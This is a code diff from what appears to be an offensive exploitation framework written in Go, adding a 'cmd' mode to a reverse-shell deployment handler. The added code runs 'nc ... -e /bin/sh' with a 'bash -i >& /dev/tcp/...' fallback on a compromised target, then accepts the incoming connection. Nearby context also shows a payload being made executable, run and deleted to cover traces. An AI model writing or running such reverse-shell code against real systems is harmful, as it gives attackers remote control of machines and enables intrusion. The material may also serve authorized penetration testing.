@@ -75,11 +75,26 @@ func (handler *Handler) DeployReverse() (net.Conn, error) {
 			return nil, err
 		}
 	case "cmd":
-		// For cmd method, the exploit's Execute() is called directly
-		// and no binary payload transfer is needed
+		// cmd method: no binary transfer; exploit's Execute() runs commands directly.
+		// The caller must call ExecuteViaCmd() explicitly per command.
+		// Return interact-ready: start a shell on the target via netcat or similar.
+		command := fmt.Sprintf("(nc %s %d -e /bin/sh 2>/dev/null || bash -i >& /dev/tcp/%s/%d 0>&1) &",
+			handler.LHOST, handler.LPORT, handler.LHOST, handler.LPORT)
+		go func() {
+			handler.executeFunc(command)
+		}()
+
+		// Wait for incoming reverse connection
+		listener.(*net.TCPListener).SetDeadline(time.Now().Add(60 * time.Second))
+		connection, err := listener.Accept()
+		listener.Close()
+		if err != nil {
+			return nil, fmt.Errorf("shell: no reverse connection received: %w", err)
+		}
+		return connection, nil
 	}
 
-	// Execute the payload
+	// Execute the payload (wget/echo methods)
 	execCommand := fmt.Sprintf("chmod +x %s && %s; rm -f %s", binaryPath, binaryPath, binaryPath)
 	go func() {
 		handler.executeFunc(execCommand)
